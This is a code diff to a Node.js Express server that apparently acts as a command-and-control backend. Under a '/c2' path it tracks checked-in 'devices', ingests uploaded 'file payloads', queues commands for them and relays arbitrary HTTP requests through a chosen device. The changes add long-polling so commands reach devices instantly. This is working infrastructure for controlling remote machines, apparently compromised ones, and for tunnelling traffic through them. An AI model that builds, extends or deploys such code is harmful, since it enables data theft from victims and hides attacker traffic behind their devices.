@@ -14,6 +14,7 @@ app.use('/c2', express.static(path.join(__dirname, 'c2')));
 const devices = new Map();
 const commandQueues = new Map();
 const pendingResponses = new Map();
+const longPollWaiters = new Map(); // deviceId -> Array of res objects
 
 const DATA_FILE = path.join(__dirname, 'devices.json');
 
@@ -63,6 +64,20 @@ function getCookie(cookieHeader, name) {
     return matches ? decodeURIComponent(matches[1]) : null;
 }
 
+function dispatchCommand(deviceId, cmd) {
+    let waiters = longPollWaiters.get(deviceId) || [];
+    while (waiters.length > 0) {
+        let res = waiters.shift();
+        if (!res.headersSent) {
+            res.json(cmd);
+            return true;
+        }
+    }
+    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
+    commandQueues.get(deviceId).push(cmd);
+    return false;
+}
+
 // Ingestion Handler for device check-ins
 function handleCheckin(req, res) {
     try {
@@ -109,17 +124,38 @@ app.post('/upload', (req, res) => {
     res.json({ success: true, message: 'File payload ingested successfully' });
 });
 
-// Device command polling (support root and /checkin alias)
+// Device command polling with Instant Long-Polling
 function handleTunnelPoll(req, res) {
     const id = req.query.deviceId;
     if (!id) return res.json({});
+
     const queue = commandQueues.get(id) || [];
-    res.json(queue.length > 0 ? queue.shift() : {});
+    if (queue.length > 0) {
+        return res.json(queue.shift());
+    }
+
+    // Long-Polling: Hold connection open up to 10s for instant 0ms dispatch
+    let polls = longPollWaiters.get(id) || [];
+    polls.push(res);
+    longPollWaiters.set(id, polls);
+
+    req.on('close', () => {
+        let list = longPollWaiters.get(id) || [];
+        longPollWaiters.set(id, list.filter(r => r !== res));
+    });
+
+    setTimeout(() => {
+        let list = longPollWaiters.get(id) || [];
+        if (list.includes(res)) {
+            longPollWaiters.set(id, list.filter(r => r !== res));
+            if (!res.headersSent) res.json({});
+        }
+    }, 10000);
 }
 app.get('/tunnel-poll', handleTunnelPoll);
 app.get('/checkin/tunnel-poll', handleTunnelPoll);
 
-// Device command response (support root and /checkin alias)
+// Device command response
 function handleTunnelResponse(req, res) {
     const data = req.body || {};
     const pending = pendingResponses.get(data.id);
@@ -246,16 +282,17 @@ app.all('*', (req, res) => {
     let relayPath = req.originalUrl.replace('/proxy', '') || '/';
     if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;
 
-    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
     pendingResponses.set(requestId, { res });
 
-    commandQueues.get(deviceId).push({
+    const cmdObj = {
         type: 'request',
         id: requestId,
         method: req.method,
         path: relayPath,
         body: req.method === 'POST' ? (typeof req.body === 'object' ? JSON.stringify(req.body) : req.body) : ''
-    });
+    };
+
+    dispatchCommand(deviceId, cmdObj);
 
     setTimeout(() => {
         if (pendingResponses.has(requestId)) {
